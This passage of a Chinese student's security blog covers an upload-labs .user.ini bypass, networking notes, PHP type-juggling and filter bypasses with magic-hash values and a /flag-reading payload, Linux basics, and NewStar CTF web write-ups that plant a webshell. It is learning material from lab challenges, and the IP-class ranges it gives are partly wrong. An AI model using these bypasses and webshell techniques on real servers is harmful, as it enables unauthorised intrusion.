class="headerlink" title=".user.ini绕过"></a>.user.ini绕过</h4><p>例如对于upload-labs第五题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题对后缀过滤非常严格,但是没过滤.ini且提示后台存在一个php文件,这样我们就可以用.user.ini绕过</p><p>因为想要引发 .user.ini 解析漏洞需要三个前提条件</p><ol><li><p>服务器脚本语言为PHP  </p></li><li><p>服务器使用CGI／FastCGI模式  </p></li><li><p>上传目录下要有可执行的php文件</p></li></ol><p>而正好这道题后台存在一个php文件</p><p>那么我们写一个这样的.user.ini文件并上传</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file = ytm666.jpg</span><br></pre></td></tr></table></figure><p>.user.ini文件里的意思是：所有的php文件都自动包含ytm666.jpg文件。.user.ini相当于一个用户自定义的php.ini</p><p>那么我们传入一个一句话木马并改后缀为jpg的文件,就可以通过.user.ini文件,利用后台存在的php文件使这个.jpg的shell文件直接执行</p>]]></content>
      
      
      <categories>
          
          <category> 周记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 周记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>培训笔记1</title>
      <link href="/2023/10/14/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B0-2023-10-14-%E7%AC%94%E8%AE%B01/"/>
      <url>/2023/10/14/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B0-2023-10-14-%E7%AC%94%E8%AE%B01/</url>
      
        <content type="html"><![CDATA[<h2 id="笔记1"><a href="#笔记1" class="headerlink" title="笔记1"></a>笔记1</h2><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>不同的数据类型只区别于占据的内存空间,而不同的占据空间会影响在计算机内开辟的内存区域,作为计算机,通过读取不同内存部分的地址来使用数据</p><p>而数据类型,就如同服务员来敲开不同门牌号(地址)的房间(内存)来拿取数据,不同的数据类型也就对应着不同数量的服务员</p><p>对于不同的数据传输,计算机和计算机,计算机和人之间如何”交流”,是通过人为规定的编码与数据对应的表来进行数据传输,从最早的ASCII表到如今的utf-8编码,一切存在世界上的文字与字符甚至表情、语言或是图片,都有对应规定的计算机编码格式,从而转换为二进制使计算机进行存储或传输数据</p><h3 id="计算机网络基础"><a href="#计算机网络基础" class="headerlink" title="计算机网络基础"></a>计算机网络基础</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/9b0e259a058e1e338ab3e50e728a2156.png" alt="1"></p><p>类似于商家，快递公司，快递员，小区，买家，小区的围栏可代表小区的容量,商家包快递和买家拆快递是种逆过程</p><p>细分:</p><ul><li><p>快递气柱&amp;包装：顶层协议封装</p></li><li><p>快递面单：底层协议封装</p></li><li><p>快递员：互联网</p></li><li><p>小区：局域网（可浅理解计算机自带围栏）</p></li><li><p>小区大门&amp;保安闸机：路由器&#x2F;网关&amp;访问策略（可浅理解为规则，eg：新疆不发）</p></li><li><p>小区围栏：防火墙（可浅理解阻止从内到外或者从外到内）</p></li><li><p>小区容量：子网掩码</p></li><li><p>单元号：IP地址&amp;Mac地址（IPv4地址32位 IPv6地址128位 Mac地址48位 Mac地址为物理地址，IP也是层级关系）</p></li><li><p>门牌号：端口号(进程)</p></li><li><p>拆快递：解封装（即逆过程）</p></li><li><p>快递验收：数据校验（最底层校验）</p></li></ul><hr><p>补充</p><ul><li><p>路由器：所有上网设备都有IP地址，而路由器有公网地址</p></li><li><p>光猫：由光纤来，电信号到光信号转换，光信号到电信号的转换</p></li><li><p>DHCP：注册的过程，帮助新入网络节点获得局域网IP地址</p></li><li><p>DNS：解决IP地址与网址的关系，即所有IP在这里都有对应的网址</p></li></ul><h4 id="ip地址"><a href="#ip地址" class="headerlink" title="ip地址"></a>ip地址</h4><p>ip地址是32位，每个字节8位，实质我们的划分就是简单的哪几个字节是网络标识，哪个是主机标识，a类就是第一个字节作为网络标识，后三个字节是主机表示。它的范围是0.0.0.0-127.0.0.0。b类前两个是网络表识别。它的范围是128.0.0.1-191.255.0.0。c类前三个是网络标识。它的范围是192.168.0.0-239.255.255.0。同理可得最后d类就是四个字节是网络标识。</p><p>还有一点就是需要注意一点，那就是表示主机地址时，不可以全为0或者全为1。全为0只有在表示对应的网络地址或IP地址不可知的情况下才使用。而全为1的主机地址一般作为广播地址。所以上面abc三类的主机地址上限算的时候都会减2。</p><h4 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h4><p>子网掩码是一个32位地址，这是一种与ip地址结合使用的技术。他有两个主要功能。一个是屏蔽ip地址的一部分，以区分网络id和主机id，并指示ip地址实在局域网上还是在远程网络上。第二个功能是将大型ip网络划分为若干个小型子网</p><p>子网的使用其实是为了减少IP的浪费，我们创建了许多网络，但有很多ip地址并没有用完，因此必须划分子网，以提高网络应用程序的效率。</p><p>在实际使用中，子网掩码是不能单独存在的，他必须结合ip地址一起使用。简单说的话，他就是用来分割子网和区分哪些ip是同一个网段的，哪些不是</p><p>比如ip地址：192.168.1.1 子网掩码：255.255.255.0</p><h3 id="计算机思维"><a href="#计算机思维" class="headerlink" title="计算机思维"></a>计算机思维</h3><p>问题分解与抽象化：计算思维鼓励将复杂问题分解成更小的、可管理的部分，同时抽象问题的关键方面。这有助于更好地理解问题的本质，使问题更容易解决。</p><p>算法设计：计算思维强调开发明确的、可执行的步骤序列，用于解决各种问题。这些步骤被称为算法，它们应该具有清晰的逻辑和正确性，以及高效性。</p><p>数据处理和分析：计算思维包括了处理和分析数据的能力，这包括数据的采集、整理、存储、分析和可视化。数据在许多领域中都是重要的资源。</p><p>模型建立：计算思维通常涉及将数学模型应用于现实世界问题。这些模型可以用来描述和解释现象，然后使用计算机进行模拟和分析。</p><p>计算机科学概念：计算思维需要了解计算机科学的基本概念，如数据结构、算法复杂性、编程语言等。这有助于更好地理解计算机工作的原理。创新和解决问题：计算思维培养了创新和解决问题的能力。它鼓励人们寻找新的方法来解决各种挑战，包括工程、科学研究、商业和社会问题。</p><p>封装思维&amp;封层思维<br>封装：互联网络思想的精髓 人穿衣服 无需考虑数据含义即可完成通讯过程；无须考虑用户输入数据，即可完成数据交互 作用：帮助从全局视角看问题，提升通用性。<br>分量：化复杂整体为简单个体 TCP&#x2F;IP 人类历史的演进过程其实就是分层的过程，更加高效地解决专业问题 作用：解决复杂问题的最简单有效的方法</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>周记1-MD5,初级绕过,Liunx基本,php反序列化</title>
      <link href="/2023/10/07/%E5%91%A8%E8%AE%B0-2023-10-07-%E5%91%A8%E8%AE%B01/"/>
      <url>/2023/10/07/%E5%91%A8%E8%AE%B0-2023-10-07-%E5%91%A8%E8%AE%B01/</url>
      
        <content type="html"><![CDATA[<h2 id="MD5碰撞"><a href="#MD5碰撞" class="headerlink" title="MD5碰撞"></a>MD5碰撞</h2><p>例如:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$password</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">substr</span>(<span class="variable">$password</span>,<span class="number">0</span>,<span class="number">6</span>)===<span class="string">&quot;c4d038&quot;</span>;</span><br></pre></td></tr></table></figure><p>对于这样的问题,传入的password值为多少才能使代码成立呢<br>这种就可以考虑写一个简单的Python脚本来实现md5弱碰撞(因为md5不可反向解码,实际是需要一个个试出来答案的),可以先从数字试起</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack</span>(<span class="params">pre</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">999999</span>):</span><br><span class="line">       <span class="keyword">if</span> (hashlib.md5(<span class="built_in">str</span>(i).encode(<span class="string">&quot;UTF-8&quot;</span>)).hexdigest())[<span class="number">0</span>:<span class="number">6</span>] == <span class="built_in">str</span>(pre):</span><br><span class="line">           <span class="built_in">print</span>(i)</span><br><span class="line">           <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">crack(<span class="string">&quot;c4d038&quot;</span>)</span><br></pre></td></tr></table></figure><p>运行后发现得出结果为114514</p><h2 id="php的一些初级绕过"><a href="#php的一些初级绕过" class="headerlink" title="php的一些初级绕过"></a>php的一些初级绕过</h2><h3 id="md5弱类型绕过"><a href="#md5弱类型绕过" class="headerlink" title="md5弱类型绕过"></a>md5弱类型绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)</span><br></pre></td></tr></table></figure><p>例如对于这样的a和b,我们可以选择传入数组绕过,但如果不允许传数组,可以选择找出两个数再md5加密后都为0e开头的即可(这样会被识别为科学记数法进而都得0)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br></pre></td></tr></table></figure><p>所以构造a&#x3D;QNKCDZO&amp;b&#x3D;s878926199a即可绕过</p><h3 id="is-numeric-和intval-绕过"><a href="#is-numeric-和intval-绕过" class="headerlink" title="is_numeric()和intval()绕过"></a>is_numeric()和intval()绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>] &gt; <span class="number">2023</span></span><br></pre></td></tr></table></figure><p>例如这样的key5,我们可以选择传数组利用php中数组类型比整形大的特点绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$c</span>) &amp;&amp; <span class="variable">$c</span> != <span class="number">1024</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$c</span>) == <span class="number">1024</span></span><br></pre></td></tr></table></figure><p>但对于这样的题里面的c就不能传数组,因为要求intval($c)等于一个整数,那么我们可以选择构造c&#x3D;1024.5a这样的payload(利用此函数舍弃小数点部分的特性)</p><p>也可以选择传入一个0x开头的字符串,因为php中intval()函数中如果字符串包括了 “0x” (或 “0X”) 的前缀,使用 16 进制 (hex)</p><h3 id="正则绕过"><a href="#正则绕过" class="headerlink" title="正则绕过"></a>正则绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="variable">$code</span>)</span><br></pre></td></tr></table></figure><p>对于这样简单的黑名单过滤,可以选择参数逃逸绕过,构造这样的payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]));&amp;a=/flag</span><br></pre></td></tr></table></figure><p>其中的var_dump()是为了让网页回显</p><p>此外还可以使用变量拼接的方法</p><h3 id="strcmp-绕过"><a href="#strcmp-绕过" class="headerlink" title="strcmp()绕过"></a>strcmp()绕过</h3><p>此函数无法比较数组可以考虑传数组绕过</p><h2 id="Liunx常用命令"><a href="#Liunx常用命令" class="headerlink" title="Liunx常用命令"></a>Liunx常用命令</h2><h3 id="操作命令"><a href="#操作命令" class="headerlink" title="操作命令"></a>操作命令</h3><p><strong>1</strong>.<br>ls命令是列出目录内容的意思（List Directtory Contents）。运行它就是列出文件夹的内容，可能是文件也可能是文件夹。</p><p>  ls -l命令以详情模式(long listing fashion)列出文件夹的内容。</p><p>  ls &#x2F;命令列出目录下的所有文件</p><p>  ls -a命令会列出文件夹里的所有内容，包括以”.”开头的隐藏文件。</p><p>  注意：在Linux中，文件以“.”开头就是隐藏文件，并且每个文件，文件夹，设备或者命令都是以文件对待。<br><strong>2</strong>.<br>pwd 显示工作路径<br><strong>3</strong>.<br>cd &#x2F;home 进入 ‘&#x2F; home’ 目录’<br>cd … 返回上一级目录<br>cd …&#x2F;… 返回上两级目录<br>cd 进入个人的主目录<br>cd ~user1 进入个人的主目录<br>cd - 返回上次所在的目录</p><h3 id="文件显示命令"><a href="#文件显示命令" class="headerlink" title="文件显示命令"></a>文件显示命令</h3><p><strong>1</strong>.<br>less：显示文件内容带分页；<br><strong>2</strong>.<br>  grep：在文件中查询内容，grep –n “查找内容” 文件名；</p><p>  | [管道命令]：在linux和unix系统中 | 就是管道命令，把上一个命令的结果交给 | 的后面的命令进行处理。</p><p>  例：grep –n “查找内容” 文件名 | more<br><strong>3</strong>.<br>  cat：把文件串连接后输出到屏幕或加 &gt; fileName 到另一个档案。<br><strong>4</strong>.<br>  head：格式：head [-n|c num]fileName，说明：显示文件头部内容。没有参数时，显示最前10行。<br><strong>5</strong>.<br>  tail：格式：tail [-n|c num]fileName，说明：显示文件尾部内容。没有参数时，显示最后10行。<br><strong>6</strong>.<br>  cut：格式：cut -cnum1-num2 filename，说明：显示每行从开头算起第 num1 到 num2 的字符。</p><h2 id="Liunx基础"><a href="#Liunx基础" class="headerlink" title="Liunx基础"></a>Liunx基础</h2><h3 id="二级目录"><a href="#二级目录" class="headerlink" title="二级目录"></a>二级目录</h3><p>&#x2F;bin</p><p>放置的是在单人维护模式下还能够被操作的指令，在&#x2F;bin目录的指令可以被root与一般账号所使用<br>&#x2F;boot</p><p>这个目录主要放置开机会用到的文件，包括linux核心文件以及开机选单与开机所需配置文件等。<br>&#x2F;dev</p><p>在Linux系统上，任何装置与设备的接口设备都是以文件的形态存在于这个目录当中的。<br>&#x2F;etc</p><p>系统的主要配置文件几乎都是放置在这个目录下，列如账号密码文件，各种服务的启始党等。<br>&#x2F;home</p><p>这是系统默认的用户家目录<br>&#x2F;lib</p><p>库文件目录<br>&#x2F;media</p><p>&#x2F;media目录底下放置的是可移除的装置，包括软盘光盘等<br>&#x2F;opt</p><p>给第三方协力软件放置的目录。<br>&#x2F;root</p><p>系统管理员的家目录<br>&#x2F;sbin</p><p>为开机过程所需要的，里面包括了开机，修复，还原系统所需要的指令。<br>&#x2F;srv</p><p>srv可以视为service的缩写，是一些网络服务启动之后，这些服务所需要取用的数据目录。</p><h3 id="三级目录"><a href="#三级目录" class="headerlink" title="三级目录"></a>三级目录</h3><p>&#x2F;usr&#x2F;lib<br>包含各应用软件的函式库、目标文件(object file)，以及不被一般使用者惯用的执行档或脚本(script)。</p><p>&#x2F;usr&#x2F;local<br>系统管理员在本机自行安装自己下载的软件(ldistribution默认提供者)，建议安装到此目录，这样会比较便于管理。</p><p>&#x2F;var&#x2F;lib<br>程序本身执行的过程中，需要使用到的数据文件放置的目录</p><p>&#x2F;var&#x2F;log(重要)<br>登录文件放置的目录,里面比较重要的文件如&#x2F;var&#x2F;log&#x2F;messages,&#x2F;var&#x2F;log&#x2F;wtmp(记录登入者的信息)等。</p><p>&#x2F;etc&#x2F;init.d&#x2F;<br>所有服务的预设启动 script 都是放在这里的</p><p>&#x2F;etc&#x2F;passwd</p><h2 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h2><p>这个博客写的还不错<a href="https://blog.csdn.net/Hardworking666/article/details/122373938">https://blog.csdn.net/Hardworking666/article/details/122373938</a><br>再推荐一下这个视频里类和对象讲的很清楚(当复习一遍了)<a href="https://www.bilibili.com/video/BV1TH4y1U7tJ?p=5&amp;vd_source=aa13d69224a955c223f4998b491b80fb">https://www.bilibili.com/video/BV1TH4y1U7tJ?p=5&amp;vd_source=aa13d69224a955c223f4998b491b80fb</a></p>]]></content>
      
      
      <categories>
          
          <category> 周记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 周记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NewStar CTF web1</title>
      <link href="/2023/09/27/CTF-NewStar-CTF-web/"/>
      <url>/2023/09/27/CTF-NewStar-CTF-web/</url>
      
        <content type="html"><![CDATA[<h2 id="泄露的秘密"><a href="#泄露的秘密" class="headerlink" title="泄露的秘密"></a>泄露的秘密</h2><p><img src="https://s2.loli.net/2023/10/01/oXic4WZ8fhR1Q7N.png" alt="1"><br>根据题目和网页的提示,认定这是一道藏有敏感文件的题,第一时间我想到的是爆破路径,但是很不巧,我没安dirseach,自己的路径扫描工具还出了问题..<br>我就打算尝试几个可能藏有敏感文件的路径,发现&#x2F;robots.txt里有一部分flag<br><img src="https://s2.loli.net/2023/10/01/yuxcONY3pQviMIZ.png" alt="1"><br>好,但是只出来了这一半,果不其然的卡关了,但是在刚才的尝试中发现了一个&#x2F;index.php路径有点特殊,据我发现网页是存在这个路径的但是显示不出来这个文件,所以通过网上的搜索,终于发现一种能下出敏感文件的路径&#x2F;<a href="http://www.zip/">www.zip</a><br><img src="https://s2.loli.net/2023/10/01/q3aXopFiYd1vLyn.png" alt="1"><br><img src="https://s2.loli.net/2023/10/01/BysdUGORo8APwI9.png" alt="1"><br>好好好还真藏在这里了,这下另一半flag也找到了,拼接一下提交这样就成功拿下第一道了</p><h2 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h2><p><img src="https://s2.loli.net/2023/10/01/ZNRz39BTIXCEoik.png" alt="1"><br>经典文件上传,那么先尝试一句话木马直接上传<br><img src="https://s2.loli.net/2023/10/01/ol5xHiSb1XVwstn.png" alt="1"><br><img src="https://s2.loli.net/2023/10/01/Pz6LXqfugHVcWmS.png" alt="1"><br>上传后发现网页过滤格式,那么我采取改成合法后缀上传后抓包再改包的这种方法植入后门<br>那么接下来改好后缀上传,直接用burpsuite抓取这个数据包<br><img src="https://s2.loli.net/2023/10/01/OpfelavXB5r1Yzn.png" alt="1"><br>此时上传就成功了,也从burpsuite内抓到了数据包<br><img src="https://s2.loli.net/2023/10/01/7ilReQJprIZy5f6.png" alt="1"><br>那么这时将这里的后缀改成php,再发回给服务器,这个木马就生效了<br><img src="https://s2.loli.net/2023/10/01/ueyiL9S78NkUXoR.png" alt="1"><br>好,这样就可以用webshell操作了,这里我用中国蚁剑操作一下<br><img src="https://s2.loli.net/2023/10/01/UCYgaBGstxfE2Ah.png" alt="1"><br>ok确认植入成功了,我们的这个木马文件也能看到在里面了,这样就可以去翻看这个服务器的各种文件了,在这之间应该就能找到本题藏有flag的文件<br><img src="https://s2.loli.net/2023/10/01/ITj5oaCKFJg3crf.png" alt="1"><br>找到了,打开这个文件看看就是答案了<br><img src="https://s2.loli.net/2023/10/01/Babp5ygEOMi6UPq.png" alt="1"></p><h2 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h2><p><img src="https://s2.loli.net/2023/10/01/XO6Yu5DkE8cRGj1.png" alt="1"><br>映入眼帘的就是传get参数,估计后面也会有post请求,那么我直接用hackbar来做了<br><img src="https://s2.loli.net/2023/10/01/3Xfe6si98MaEhov.png" alt="1"><br>果然下一步就是传post参数,但是需要找一找secret的值<br><img src="https://s2.loli.net/2023/10/01/gxBGPLs3EuvOAUy.png" alt="1"><br>从网页源码翻翻就找到了,base64解个码传上去<br><img src="https://s2.loli.net/2023/10/01/vl8CdaHPknuz5gt.png" alt="1"><br>ok传好值了,接下来看看请求头部分有没有信息吧<br><img src="https://s2.loli.net/2023/10/01/p9RZ3f8aeEJqH15.png" alt="1"><br>发现cookie部分有题目要求的验证内容,将其改成ctfer<br><img src="https://s2.loli.net/2023/10/01/xuUStgeFZ3NQwO7.png" alt="1"><br>成功,又是一关,依旧是改请求头部分,这次因为是浏览器指定要求,那么就修改User Agent部分为题目要求<br><img src="https://s2.loli.net/2023/10/01/gPBUu2vTrxQ8RoG.png" alt="1"><br>好了又是经典改请求头,这次是修改referer部分<br><img src="https://s2.loli.net/2023/10/01/ZvuChPbkrydGEs5.png" alt="1"><br>终于到最后了,也是经典套路本地访问,经过多次尝试试出了是哪条语句生效<br><img src="https://s2.loli.net/2023/10/01/BskA2rYRNiSVq3j.png" alt="1"><br>为了方便一次性尝试我用的burpsuite抓包一次性都写进去发包,但是坐大牢了,整了半天发现最后是X-real-IP这条语句才能生效,不过最后也是成功了<br>那么这次就用hackbar演示一下结果吧<br><img src="https://s2.loli.net/2023/10/01/lKCOuchso8JQIbY.png" alt="1"><br>PS: 最后一部分通过和我亲爱的蓝学长讨论,得知到更简单的伪造ip方法在此致谢此大佬</p><h2 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h2><p><img src="https://s2.loli.net/2023/10/01/eFNwvEpmSZ2WcTf.png" alt="1"><br>开局看到这个提示一时间想到传参,但不清楚Flask是什么东西,通过查阅得知Flask是一个网页的框架,也是可以接收正常请求的<br>我尝试着传了这两个指定的参数<br><img src="https://s2.loli.net/2023/10/01/rdVfzQHpY5Ui8gE.png" alt="1"><br>发现出现这样的提示,得知flag就在源码中,但Flask框架的源码目前不清楚怎么查看,我又进行了几次尝试<br>此时发现如果传入的不是数字就会有这样的页面<br><img src="https://s2.loli.net/2023/10/01/bPcDzuXOjKh1Yn2.png" alt="1"><br>当时对这个界面确实匪夷所思,一直想着是不是还是对参数的改变才能得出答案,但是仔细一想这题的主要内容是Flask,经过长时间的周转我打算仔细看看这个显示出来的界面<br>结果细看发现这不就是源码吗..通过翻找就找到了flag<br><img src="https://s2.loli.net/2023/10/01/QTWLrlh1FBG6JxK.png" alt="1"><br>(这题确实没想到这么简单,之前和贺同学交流得知如果是ssti漏洞就会难不少)</p><h2 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h2><p><img src="https://s2.loli.net/2023/10/01/worm4qKu5RAx7JD.png" alt="1"><br>翻翻这道题,发现是有五层保护,需要一层一层绕过<br>那么先来到第一层,要求key1和key2不同但md5加密后相同,那就根据md5加密的机制传两个不一样的数组<br><img src="https://s2.loli.net/2023/10/01/dAv3YqSWOTVsnZ8.png" alt="1"><br>如图,第一层就过了<br>第二层是传个post参数经过md5加密和sha1加密后强相等才能通过,那就再传个数组呗<br><img src="https://s2.loli.net/2023/10/01/VindBhLTReYN2P9.png" 